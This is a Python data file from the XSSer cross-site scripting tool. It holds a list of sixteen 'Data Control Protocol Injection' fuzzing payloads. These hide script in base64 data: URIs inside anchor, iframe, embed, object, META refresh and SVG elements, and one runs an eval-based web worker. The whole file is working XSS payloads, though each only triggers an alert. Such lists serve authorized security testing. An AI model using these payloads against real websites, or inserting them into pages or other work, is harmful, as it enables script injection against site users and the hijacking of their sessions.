#!/usr/bin/env python
# -*- coding: utf-8 -*-"
# vim: set expandtab tabstop=4 shiftwidth=4:
"""
This file is part of the XSSer project, https://xsser.03c8.net

Copyright (c) 2010/2019 | psy <epsylon@riseup.net>

xsser is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 3 of the License.

xsser is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with xsser; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
## This file contains different XSS fuzzing vectors.
## If you have some new, please email me to [epsylon@riseup.net]
## Happy Cross Hacking! ;)

DCPvectors = [
		{ 'payload' : """<a href="data:text/html;base64,[B64]%3cscript%3ealert("PAYLOAD");history.back();%3c/script%3e"></a>[B64]""",
          'browser' : """[Data Control Protocol Injection]"""},
		{ 'payload' : """<iframe src="data:text/html;base64,[B64]%3cscript%3ealert("PAYLOAD");history.back();%3c/script%3e"></[B64]""",
		  'browser' : """[Data Control Protocol Injection]"""},	
		{ 'payload' : """0?<script>Worker("#").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,[B64]<script>alert("PAYLOAD");history.back();</script>[B64]'))""",
		  'browser' : """[Data Control Protocol Injection]"""},
		{ 'payload' : """<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,[B64]<script>alert("PAYLOAD");history.back();</script>[B64]"&#09;&#10;&#11;>Y</a""",
		  'browser' : """[Data Control Protocol Injection]"""},
		{ 'payload' : """<EMBED SRC="data:image/svg+xml;base64,[B64]<script>alert("PAYLOAD");history.back();</script>[B64]" type="image/svg+xml" AllowScriptAccess="always"></EMBED>""",
		  'browser' : """[Data Control Protocol Injection]"""},
		{ 'payload' : """<embed src="data:text/html;base64,[B64]<script>alert("PAYLOAD");history.back();</script>[B64]"></embed>""",
		  'browser' : """[Data Control Protocol Injection]"""},
		{ 'payload' : """<iframe/src="data:text/html;&Tab;base64&Tab;,[B64]<script>alert("PAYLOAD");history.back();</script>[B64]">""",
		  'browser' : """[Data Control Protocol Injection]"""},
		{ 'payload' : """<META HTTP-EQUIV="refresh" CONTENT="0;url=data:image/svg+xml; base64,[B64]<script>alert("PAYLOAD");history.back();</script>[B64]">""",
		  'browser' : """[Data Control Protocol Injection]"""},
		{ 'payload' : """"><META HTTP-EQUIV="refresh" CONTENT="0;url=data:image/svg+xml; base64,[B64]<script>alert("PAYLOAD");history.back();</script>[B64]">""",
		  'browser' : """[Data Control Protocol Injection]"""},
		{ 'payload' : """<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html; base64,[B64]<script>alert("PAYLOAD");history.back();</script>[B64]">""",
		  'browser' : """[Data Control Protocol Injection]"""},
		{ 'payload' : """<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,[B64]<script>alert("PAYLOAD");history.back();</script>[B64]">""",
		  'browser' : """[Data Control Protocol Injection]"""},
		{ 'payload' : """"><META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html; base64,[B64]<script>alert("PAYLOAD");history.back();</script>[B64]">""",
		  'browser' : """[Data Control Protocol Injection]"""},
		{ 'payload' : """<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,[B64]<script>alert("PAYLOAD");history.back();</script>[B64]">""",
		  'browser' : """[Data Control Protocol Injection]"""},
		{ 'payload' : """<object data="data:text/html;base64,[B64]<script>alert("PAYLOAD");history.back();</script>[B64]"></object>""",
		  'browser' : """[Data Control Protocol Injection]"""},
		{ 'payload' : """<object data=data:text/html;base64,[B64]<script>alert("PAYLOAD");history.back();</script>[B64]></object>​""",
		  'browser' : """[Data Control Protocol Injection]"""},
		{ 'payload' : """data:image/svg+xml;base64,[B64]<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.0" x="0" y="0" width="194" height="200" id="Y"><script type="text/ecmascript">alert("PAYLOAD");</script></svg>[B64]""",
          'browser' : """[Data Control Protocol Injection]""" }
		]
